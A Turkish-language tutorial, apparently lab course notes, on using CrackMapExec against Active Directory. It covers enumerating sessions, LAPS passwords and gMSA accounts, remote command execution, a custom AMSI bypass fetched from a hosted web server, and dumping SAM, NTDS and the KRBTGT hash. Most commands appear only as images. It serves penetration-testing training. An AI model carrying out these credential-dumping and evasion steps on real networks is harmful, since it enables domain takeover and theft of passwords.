+CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
+
+![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
+![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+
+Daha önce çalışmamış olanları gözden geçirelim:
+
+### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+
+Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+
+
+### Sessions ve loggendon-users seçeneklerini kullanma
+![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
+
+Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+
+
+### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
+![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
+![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+
+### Enumerate Computers
+
+CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
+
+
+### Domain'deki Bilgisayarları Numaralandırma
+![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
+
+
+### Enumerate LAPS
+
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+
+![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
+
+![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+
+![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
+
+Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
+
+
+### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
+
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+
+
+### List Local Users
+
+![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
+![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
+![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
+![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
+![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+
+Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+
+rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
+
+
+### Enumerate Disks
+
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+
+### Enumerating Disks
+![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+
+### Local ve Domain Gruplarını Numaralandırma
+Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+### Enumerating Local Groups
+![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
+![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
+
+
+### Enumerating Domain Groups
+![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
+![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
+
+Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+
+
+### Group **Members**
+![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
+
+Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+
+
+### Querying WMI
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+
+Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+
+WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+
+
+### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
+![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
+
+WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+
+
+### Quering root\WMI Namespace
+![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
+![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
+
+Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+
+Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
+
+
+### LDAP and RDP Enumeration
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
+
+
+### LDAP & RDP Commands
+LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
+![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
+![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
+
+Henüz çalışmadıklarımızı gözden geçirelim.
+
+
+### Enumerating Users and Groups
+
+SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+
+### Enumerating Users and Groups
+
+![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
+![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
+![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
+![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+
+
+### İlginç Hesap Özelliklerini Numaralandırma
+
+ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+
+PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
+
+
+### PASSWD_NOTREQD Özniteliğinin Tanımlanması
+
+![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
+![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
+
+TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Kısıtlamasız Delegasyonun Belirlenmesi
+![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
+
+adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+
+
+### adminCount Özniteliğini Sorgulama
+![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
+![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
+![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+
+
+### Domain SID'sini numaralandırma
+
+Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+
+
+### Gathering the Domain SID
+
+![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
+![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+
+
+### Group Managed Service Accounts (gMSA)
+
+Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:
+
+* Otomatik parola yönetimi.
+* Basitleştirilmiş service principal name (SPN) yönetimi.
+* Yönetimi diğer yöneticilere devretme yeteneği
+
+Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+
+Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
+
+Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
+
+
+### Enumerating Accounts with gMSA Privileges
+![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
+![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
+
+Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+
+
+### gMSA Parolasını Edinme
+![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
+
+
+### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
+![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
+![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
+
+
+### RDP Screenshots
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+
+### Enumerate Login Prompt
+![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
+
+Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
+
+
+
+### Taking a Screenshot
+![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
+![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+
+
+Not: --screentime ve --res isteğe bağlı bayraklardır.
+
+Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
+
+
+Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
+
+
+
+
+
+### Command Execution
+
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+
+![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+
+Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+
+Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+
+
+
+### Command Execution as Administrator
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+
+
+### Bir Komutu Administrator Olarak Çalıştırma
+![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
+![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+
+### RID 500 Dışı Hesap Olarak Komut Yürütme
+Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+
+### Komutu localadmin olarak çalıştırma
+![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+
+
+### LocalAccountTokenFilterPolicy'yi Değiştirme
+![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
+
+![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+
+
+### Domain Hesabı Olarak Komut Yürütme
+LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+
+### Komutu Robert olarak çalıştır
+![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+
+### SMB ile Komut Yürütme
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
+
+Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+
+Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
+
+![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+
+
+### SMBExec Yöntemi ile Komut Yürütme
+![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
+
+
+### wmiexec aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
+![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
+
+12. AMSI baypas
+13. Payload'u gizleyin
+14. Payload'u çalıştırın
+
+### Özel AMSI Bypass Çalıştırma
+
+Bu teknikler PowerShell çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, --amsi-bypass seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:
+
+15. “Değiştirilmiş Amsi ScanBuffer Yaması” içeren dosyayı indirin
+
+
+### “Değiştirilmiş Amsi ScanBuffer Yaması” ile Bir Dosya Oluşturun
+![Pasted image 20241203101828.png](/img/user/resimler/Pasted%20image%2020241203101828.png)
+Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır
+
+### Komut Maksimum Uzunluğu Aşıyor
+![Pasted image 20241203102011.png](/img/user/resimler/Pasted%20image%2020241203102011.png)
+![Pasted image 20241203102018.png](/img/user/resimler/Pasted%20image%2020241203102018.png)
+
+16. Bu sorunu çözmek için, shantanukhande-amsi.ps1 dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.
+
+### PowerShell Komut Dosyasını Oluşturma ve Barındırma
+![Pasted image 20241203102127.png](/img/user/resimler/Pasted%20image%2020241203102127.png)
+
+Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.
+
+Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:
+
+
+### PowerShell Özel AMSI Bypass Kullanma
+![Pasted image 20241203102312.png](/img/user/resimler/Pasted%20image%2020241203102312.png)
+![Pasted image 20241203102346.png](/img/user/resimler/Pasted%20image%2020241203102346.png)
+
+
+### WinRM Kullanarak Komut Yürütme
+WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port 5985 ve HTTPS TCP port 5986'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için yönetici olmasını gerektirmemesidir. Administrators grubunun üyesiysek, Remote Management Users grubunun üyesiysek veya oturum yapılandırmasında açık PowerShell Remoting izinlerimiz varsa WinRM protokolünü kullanabiliriz.
+
+
+### Command Execution using WinRM
+![Pasted image 20241203102455.png](/img/user/resimler/Pasted%20image%2020241203102455.png)
+![Pasted image 20241203102501.png](/img/user/resimler/Pasted%20image%2020241203102501.png)
+
+
+
+### WinRM aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203102608.png](/img/user/resimler/Pasted%20image%2020241203102608.png)
+
+
+### Other PowerShell Options
+
+WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:
+
+![Pasted image 20241203102901.png](/img/user/resimler/Pasted%20image%2020241203102901.png)
+
+Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.
+
+
+### SSH Command Execution
+CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.
+
+### Command Execution with SSH
+![Pasted image 20241203103019.png](/img/user/resimler/Pasted%20image%2020241203103019.png)
+![Pasted image 20241203103028.png](/img/user/resimler/Pasted%20image%2020241203103028.png)
+![Pasted image 20241203103033.png](/img/user/resimler/Pasted%20image%2020241203103033.png)
+
+Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da public ve private anahtarları kullanmaktır. CrackMapExec, --key-file seçeneği ile private key kullanımını destekler. Anahtarın çalışması için OPENSSH formatında olması gerekir.
+
+
+### Private Key Kullanarak SSH ile Komut Yürütme
+![Pasted image 20241203103449.png](/img/user/resimler/Pasted%20image%2020241203103449.png)
+
+Not: Herhangi bir parola yapılandırılmamışsa, -p seçeneğini boş (“”) olarak ayarlamalıyız, aksi takdirde bir hata alırız
+
+Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
+
+
+### Gizli Bilgileri Bulma ve Kullanma
+Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+
+
+### SAM
+SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
+
+
+### Dumping SAM
+![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
+![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+
+### NTDS Active Directory Database
+
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+
+https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+
+Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+
+Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+
+
+### Domain Controller'dan NTDS veritabanını boşaltma
+![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
+![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
+![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
+![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
+![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
+![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+
+--ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+
+
+### Yalnızca KRBTGT Hesabının Boşaltılması
+![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
+
+Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+
+
